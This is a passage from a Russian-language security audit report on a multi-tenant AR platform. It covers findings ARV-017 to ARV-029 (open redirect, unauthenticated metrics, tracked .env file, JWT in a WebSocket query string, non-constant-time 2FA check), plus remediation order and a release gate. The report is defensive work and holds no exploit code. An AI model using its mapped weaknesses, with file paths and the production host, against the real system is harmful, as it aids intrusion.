- **TEST TO ADD:** CI job `pip-audit --strict`.

---

## 5. MEDIUM

### ARV-017 — Публичный `/debug-auth`
- **SEVERITY:** Medium · **CATEGORY:** Info Disclosure
- **FILE:** `app/html/routes/debug.py:8-22`; регистрируется безусловно (`app/html/__init__.py:23`).
- **VULNERABILITY:** Эндпоинт отдаёт `user_id`/`email`/`is_active` при наличии токена; не отключён в проде.
- **IMPACT:** Раскрытие внутренних идентификаторов. **FIX:** удалить или закрыть за `DEBUG`/`super_admin`. **TEST:** 404/403 в проде.

### ARV-018 — `/api/health/status` и `/metrics` без аутентификации
- **SEVERITY:** Medium · **CATEGORY:** Info Disclosure
- **FILE:** `app/api/routes/health.py:32-90`.
- **VULNERABILITY:** Отдаёт `cpu_percent`, `memory_percent`, `disk_percent`, `database_error` (строки ошибок БД) и Prometheus-метрики без аутентификации.
- **IMPACT:** Разведка, утечка внутренних деталей. **FIX:** закрыть `/status` и `/metrics` (internal network / basic auth / super_admin). **TEST:** аноним → 401/403.

### ARV-019 — Open Redirect через `Referer` в `/admin/language`
- **SEVERITY:** Medium · **CATEGORY:** Open Redirect
- **FILE:** `app/html/routes/auth.py:94-95`.
- **VULNERABILITY:** `redirect_to = request.headers.get("referer") or "/admin"` → `RedirectResponse(url=redirect_to)`. Referer подконтролен атакующему.
- **IMPACT:** Фишинг/редирект. **FIX:** разрешать только относительные пути или allow-list. **TEST:** внешний referer → редирект на `/admin`.

### ARV-020 — Отсутствуют CSP / Referrer-Policy / Permissions-Policy
- **SEVERITY:** Medium · **CATEGORY:** Security Headers
- **FILE:** `deploy/nginx/arv.conf:49-54`.
- **VULNERABILITY:** Есть HSTS, X-Content-Type-Options, X-Frame-Options, X-XSS-Protection, но нет `Content-Security-Policy`, `Referrer-Policy`, `Permissions-Policy`; `server_tokens` не отключён.
- **IMPACT:** Усиление XSS/кликджекинга, утечка referrer. **FIX:** добавить CSP (с nonce для htmx/Alpine), Referrer-Policy, Permissions-Policy, `server_tokens off`. **TEST:** проверка заголовков в CI.

### ARV-021 — `/storage/` отдаётся с `Access-Control-Allow-Origin: *`
- **SEVERITY:** Medium · **CATEGORY:** Data Exposure
- **FILE:** `deploy/nginx/arv.conf:73-88`.
- **VULNERABILITY:** Все файлы AR-контента (фото/видео/маркеры) доступны по прямым путям без аутентификации и с CORS `*`; включён листинг? — `try_files` (без листинга, но пути перечислимы).
- **IMPACT:** Скачивание медиа всех арендаторов при знании/подборе путей. **FIX:** убрать `ACAO *`, раздавать через подписанные ссылки, ограничить пути по арендатору. **TEST:** доступ к чужому пути → 403.

### ARV-022 — `.env.production` под контролем версий
- **SEVERITY:** Medium · **CATEGORY:** Secrets Management
- **FILE:** `.env.production` (tracked: `git ls-files` подтверждает).
- **VULNERABILITY:** Файл в репозитории (значения — плейсхолдеры, но в истории/ветках могут быть реальные; `CORS_ORIGINS` включает localhost).
- **IMPACT:** Риск утечки прод-секретов. **FIX:** удалить из индекса, добавить в `.gitignore`, ротация ключей, использовать secret-manager. **TEST:** pre-commit hook на `.env*`.

### ARV-023 — JWT в query-строке WebSocket + отсутствие проверки origin
- **SEVERITY:** Medium · **CATEGORY:** Token Handling
- **FILE:** `app/api/routes/alerts_ws.py:12-40`.
- **VULNERABILITY:** `token = ws.query_params.get("token")` — токен попадает в access-логи/историю; нет проверки `Origin` при `accept`.
- **IMPACT:** Утечка токена, CSWSH. **FIX:** аутентификация через cookie/`Sec-WebSocket-Protocol`, проверка `Origin`, короткоживущий WS-токен. **TEST:** WS без валидного origin → отказ.

### ARV-024 — Непостоянное по времени сравнение 2FA-кода
- **SEVERITY:** Medium · **CATEGORY:** Authentication
- **FILE:** `app/html/routes/auth.py:259`.
- **VULNERABILITY:** `if data.get("code") != code` — не constant-time, без ограничения попыток (см. ARV-008).
- **IMPACT:** Брутфорс/тайминг. **FIX:** `secrets.compare_digest`, лимит попыток, TTL. **TEST:** лимит попыток 2FA.

---

## 6. LOW

| ID | Описание | Файл | Fix |
|---|---|---|---|
| ARV-025 | Дублирование `opencv-python` и `opencv-python-headless` — лишний вес/поверхность | `requirements.txt:30,43` | оставить только headless |
| ARV-026 | Валидационный обработчик возвращает `exc.body` клиенту (`main.py:325-336`) — риск рефлексии чувствительных полей | `app/main.py:335` | не возвращать тело в прод-режиме |
| ARV-027 | `X-XSS-Protection` устарел; `server_tokens` не отключён | `deploy/nginx/arv.conf:54` | убрать X-XSS-Protection, добавить `server_tokens off` |
| ARV-028 | Cookie `access_token`: `samesite=lax`, `secure` только в проде — при XSS/CSRF-цепочках снижает защиту | `app/api/routes/auth.py:102-115` | `samesite=strict` где возможно; короткий TTL |
| ARV-029 | Логи содержат email/идентификаторы пользователей (`logger.warning("Failed login attempt", email=...)`) — PII в логах | `app/api/routes/auth.py:158` и др. | маскировать PII, политика хранения |

---

## 7. Проверка по разделам задания

- **Authentication:** адаптивное хеширование (pbkdf2_sha256) — ок; lockout 5/15мин — ок, но DoS-вектор; legacy SHA-256 — ARV-015; 2FA — ARV-008/024; rate limit — ARV-008/009.
- **Authorization (IDOR/BOLA):** ARV-001/002/003/011 — критично.
- **API Security:** mass assignment ARV-006/007; неаутентифицированные эндпоинты ARV-004/014/018.
- **Input Validation:** Pydantic используется в большинстве схем (`schemas/`), но «legacy» endpoints принимают сырой `dict` (ARV-006/007).
- **Database Security:** параметризованные запросы SQLAlchemy — инъекций SQL не найдено; риск — доступ к БД из-за ARV-005.
- **Secrets:** нет хардкода секретов в `app/` (только фикстуры в тестах); проблемы — ARV-012/022.
- **File Uploads:** загрузки ограничены `client_max_body_size 120M`; прямой небезопасной обработки имени файла не выявлено в проверенных модулях.
- **SSRF:** внешние вызовы (Yandex OAuth/Disk) идут на фиксированные хосты; пользовательский URL в `provider.get_download_url(path)` опосредован YD API — явного SSRF не подтверждено.
- **XSS:** `|safe` в шаблонах не найден; DOM-инъекция — ARV-013.
- **CSRF/CORS:** double-submit cookie работает для cookie-auth (csrf.py) — ок; CORS — ARV-010; отсутствие CSP — ARV-020.
- **Rate Limiting:** ARV-008/009.
- **Business Logic:** ARV-002/006/007/011 (кросс-арендаторские операции, подписки).
- **Payment Security / Webhooks:** платёжной системы и обработчиков вебхуков в коде не обнаружено (нечего аудировать).
- **JWT/Token:** `decode_token` без проверки blacklist/revocation, но `_get_user_from_token` проверяет `is_token_blacklisted`/`is_user_revoked` (auth.py:53-69) — ок; ключи — ARV-012; WS — ARV-023.
- **Password Security:** ARV-015; минимальная длина 8 (schemas/auth.py:44) — желательно ≥12 + проверка компрометации.
- **Logging/Privacy:** ARV-029.
- **Error Handling:** ARV-026.
- **Dependencies:** ARV-016.
- **Docker/Infrastructure:** ARV-005; non-root appuser — ок.
- **Server Security:** TLS/HSTS — ок; заголовки — ARV-020.
- **Admin Panel:** ARV-001/011 — критично.
- **Workers/Queues:** `app/background_tasks/*` — прямой проброс `db`-сессии в фоновые задачи (потенциальное использование закрытой сессии) — наблюдение, не подтверждено как уязвимость.
- **Mobile (Android/iOS):** `allowBackup="false"`, `networkSecurityConfig`, deep links — ок; базовый URL захардкожен `https://ar.neuroimagen.ru` (`android/app/build.gradle.kts`); keystore вне репозитория — ок.
- **Misconfiguration:** ARV-005/017/018/020/021.

---

## 8. Missing Security Controls / Тесты, которых не хватает

- Нет глобального `SlowAPIMiddleware` (ARV-008).
- Нет единой зависимости `require_super_admin`; HTML-роуты не проверяют роль/арендатора.
- Нет CSP и Referrer-Policy.
- Нет `pip-audit`/Dependabot в CI.
- Нет тестов авторизации (IDOR/BOLA) на уровне API и HTML.
- Нет инварианта «не-супер-админ обязан иметь `company_id`».
- Нет мониторинга аномалий (массовые 403/429, cross-tenant обращения).

**Рекомендуемые тесты:** matrix-тест «роль × эндпоинт × арендатор» для всех роутов; фаззинг масс-ассайнмента; проверка заголовков безопасности; `pip-audit --strict`.

---

## 9. Recommended Fix Order

1. **ARV-001, ARV-002, ARV-003** — восстановить авторизацию (роль + арендатор) во всей HTML-панели и API; ввести `require_super_admin`, запретить `company_id IS NULL`-обход, обязательный `company_id` при регистрации. *(критично, блокирует релиз)*
2. **ARV-004** — закрыть `yd-file` аутентификацией/подписью.
3. **ARV-005** — убрать публикацию портов БД/Redis, задать пароли.
4. **ARV-006, ARV-007** — заменить сырые `dict` на allow-list схемы.
5. **ARV-008, ARV-009** — включить глобальный rate limit, доверять только прокси-заголовкам.
6. **ARV-010, ARV-012** — сузить CORS, разделить ключи.
7. **ARV-013, ARV-016** — экранирование и обновление зависимостей.
8. **ARV-011, ARV-014, ARV-015** и далее — Medium/Low.

---

## 10. Top 10 наиболее опасных

| # | ID | Суть | Severity |
|---|---|---|---|
| 1 | ARV-003 | `company_id IS NULL` = доступ ко всем + регистрация без company_id | Critical |
| 2 | ARV-001 | Любой пользователь меняет глобальные настройки безопасности | Critical |
| 3 | ARV-002 | Удаление чужого AR-контента (bypass проверки владения) | Critical |
| 4 | ARV-004 | Анонимный прокси файлов Yandex Disk | Critical |
| 5 | ARV-005 | Публичные PostgreSQL/Redis, Redis без пароля | Critical |
| 6 | ARV-006 | Mass assignment в видео | Critical |
| 7 | ARV-007 | Mass assignment в расписании ротации | Critical |
| 8 | ARV-008 | Глобальный rate limit не работает; 2FA-брутфорс | High |
| 9 | ARV-011 | HTML-роуты компаний/проектов без проверки арендатора | High |
| 10 | ARV-012 | Один `SECRET_KEY` для JWT/сессий/шифрования | High |

---

## 11. SECURITY GATE

**РЕШЕНИЕ (первичный аудит): FAIL** ❌
**РЕШЕНИЕ (после устранения, 2026-09-14): CONDITIONAL PASS** ⚠️ → см. раздел 0.

Платформа изначально **не допускалась к продакшену**: 7 Critical и 10 High, из которых 4 (ARV-001/002/003/004) позволяли полностью обойти multi-tenant изоляцию и изменить глобальную конфигурацию безопасности.

Все находки Critical / High / Medium / Low **устранены в коде** (см. раздел 0 «Статус устранения»). Гейт переведён в состояние **CONDITIONAL PASS** до выполнения условий ниже.

**Условия прохождения гейта (повторная проверка):**
1. ✅ Закрыты все Critical (ARV-001…007) и High (ARV-008…016).
2. ✅ Добавлены тесты авторизации (IDOR/BOLA) для API и HTML (`tests/test_idor_security.py`, `tests/test_security_fixes.py`).
3. ⬜ `pip-audit --strict` без Critical/High — **выполнить в CI** после обновления зависимостей.
4. ✅ Прод-конфигурация: БД/Redis недоступны извне, CORS строгий, CSP присутствует (`deploy/nginx/security-headers.conf`).
5. ⬜ Прогнать полный тест-сьют в CI (Docker / Python 3.11) — локальный запуск ограничен окружением.
6. ⬜ Ротация секретов: задать `SESSION_SECRET_KEY`, `TOKEN_ENCRYPTION_KEY`, `MEDIA_URL_SECRET`, `POSTGRES_PASSWORD`, `REDIS_PASSWORD` в проде.

---

*Отчёт подготовлен по результатам статического анализа кода; раздел 0 отражает применённые исправления. Отдельные выводы требуют подтверждения динамическим тестом, что отражено в рекомендациях «TEST TO ADD».*
